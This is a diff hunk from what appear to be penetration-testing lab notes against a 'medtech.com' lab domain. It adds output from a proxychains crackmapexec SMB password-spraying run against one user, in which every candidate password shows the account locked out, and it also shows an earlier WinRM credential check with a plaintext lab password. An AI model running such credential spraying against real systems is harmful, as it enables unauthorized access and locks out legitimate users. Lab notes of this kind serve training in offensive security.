@@ -517,3 +517,12 @@ PS C:\Tools>
 HTTP        172.16.204.10   5985   172.16.204.10    [*] http://172.16.204.10:5985/wsman
 WINRM       172.16.204.10   5985   172.16.204.10    [-] medtech.com\joe:Flowers1
 ```
+
+```
+┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge1]
+└─$  proxychains -q crackmapexec smb 172.16.193.82 -u yoshi -p password.txt --continue-on-success 
+SMB         172.16.193.82   445    CLIENT01         [*] Windows 10.0 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:lab STATUS_ACCOUNT_LOCKED_OUT 
+SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:Flowers1 STATUS_ACCOUNT_LOCKED_OUT 
+SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
+```
